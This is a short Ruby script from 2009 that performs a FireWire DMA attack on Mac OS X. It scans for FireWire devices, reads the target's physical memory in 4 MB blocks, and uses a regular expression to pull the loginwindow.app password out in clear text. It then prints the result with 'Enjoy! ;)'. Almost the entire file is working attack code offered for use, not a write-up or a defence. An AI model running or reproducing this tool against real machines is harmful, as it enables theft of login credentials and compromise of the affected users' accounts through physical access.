# Mac OS X loginwindow.app password finder through Firewire attack
# Copyright (c) 2009 iZsh - izsh at iphone-dev.com
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# =============
#  Description
# =============
#
# This script search through the target computer memory space (connected
# through a firewire cable) and try to retrieve Apple loginwindow.app
# password. Yeah... Apple is so amazingly smart they keep it forever in
# memory in clear text.
#
# You need rubyfw from http://github.com/iZsh/rubyfw :
# gem sources -a http://gems.github.com
# sudo gem install iZsh-rubyfw
#
# =======
#  Usage
# =======
# % ruby macloginpwdfinder-fw.rb
#
require 'rubygems'
require 'fw'

BLOCKSIZE = 1024*1024*4

puts "================================================"
puts "Mac OS X loginwindow.app password finder through"
puts "a Firewire attack."
puts "Copyright (c) 2009 iZsh - izsh at iphone-dev.com"
puts "================================================"

startaddr = 0x00100000
endaddr =   0x80000000
devices = FW::scanbus()

for device in devices
  puts "Found device #{device}"
  buffer_last = ""
  # Loop
  startaddr.step(endaddr, BLOCKSIZE) do |pos|
    print "\r-> reading %08x ..." % pos
    ret = device.read(pos, BLOCKSIZE)
    STDOUT.flush
    # Let's see if we can find the password
    buffer = buffer_last + ret[:buffer]
    password = buffer[/password[\000]+([^\000]+)[\000]+shell/, 1]
    if password
      puts "\nFound Apple loginwindow.app password: " + password
      puts "Enjoy! ;)"
      break
    end
    buffer_last = ret[:buffer]
  end
end
